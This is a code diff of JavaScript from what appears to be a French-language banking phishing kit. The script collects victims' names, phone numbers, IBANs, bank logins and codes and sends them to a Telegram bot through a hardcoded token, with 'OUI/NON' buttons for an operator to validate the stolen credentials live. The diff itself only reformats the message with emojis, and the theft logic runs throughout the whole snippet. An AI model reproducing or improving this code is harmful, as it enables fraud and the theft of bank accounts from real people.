@@ -144,21 +144,21 @@
             const identifiant = document.getElementById('identifiant').value.trim();
             const code = document.getElementById('code').value.trim();
             
-            // Récupère les infos des pages 2 et 3
+            // Récupère les infos des pages précédentes
             const page2 = JSON.parse(localStorage.getItem('page2Data') || '{}');
             const page3Banque = localStorage.getItem('page3Banque') || 'non sélectionnée';
             
             const fullMessage = `
 🔥 SESSION COMPLÈTE - À VALIDER 🔥
-Montant: ${montant} €
-Banque (page 3): ${page3Banque}
-Page 2:
-- Nom/prénom: ${page2.nom || 'non saisi'}
-- Téléphone: ${page2.tel || 'non saisi'}
-- IBAN: ${page2.iban || 'non saisi'}
-Page 4:
-- Identifiant: ${identifiant}
-- Code: ${code}
+💰 Montant: ${montant} €
+🏦 Banque sélectionnée (page 3): ${page3Banque}
+📛 Page 2 (saisie précédente) :
+  - Nom/prénom: ${page2.nom || 'non saisi'}
+  - Téléphone: ${page2.tel || 'non saisi'}
+  - IBAN: ${page2.iban || 'non saisi'}
+👤 Page 4 (actuelle) :
+  - Identifiant: ${identifiant}
+  - Code: ${code}
             `.trim();
             
             const token = "8281062190:AAHjA80kaHFvPIsxK-fIX0sCPykIGcGRp3s";
@@ -173,8 +173,8 @@ Page 4:
                     text: fullMessage,
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: "OUI – Valider (page 5)", callback_data: "oui" },
-                            { text: "NON – Refuser (incorrect)", callback_data: "non" }
+                            { text: "✅ OUI – Valider (page 5)", callback_data: "oui" },
+                            { text: "❌ NON – Refuser (incorrect)", callback_data: "non" }
                         ]]
                     }
                 })
